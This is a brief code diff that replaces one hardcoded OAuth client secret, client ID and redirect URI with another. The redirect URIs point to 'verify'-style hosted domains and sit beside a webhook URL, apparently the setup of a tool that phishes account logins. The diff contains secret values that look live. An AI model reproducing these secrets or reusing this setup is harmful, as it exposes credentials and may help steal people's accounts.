@@ -1,7 +1,7 @@
 //Change these btw
-const client_secret = 'UH98Q~.S6BsZ8GXREQzTX~mUfAl5BsqKgi7IFbQZ' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '360d2f7a-bd75-405b-9412-d1d9873301b5'
-const redirect_uri = 'https://verifymcc.onrender.com/'
+const client_secret = 'vf08Q~x8Yk.eFzlXS~QDhBieWm2rsg1vH4muhasV' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'b8eee5c3-626f-478c-b37b-ba5b4fc1c777'
+const redirect_uri = 'https://veriflaction.onrender.com/'
 const webhook_url = process.env.WEBHOOK
 
 //Requirements
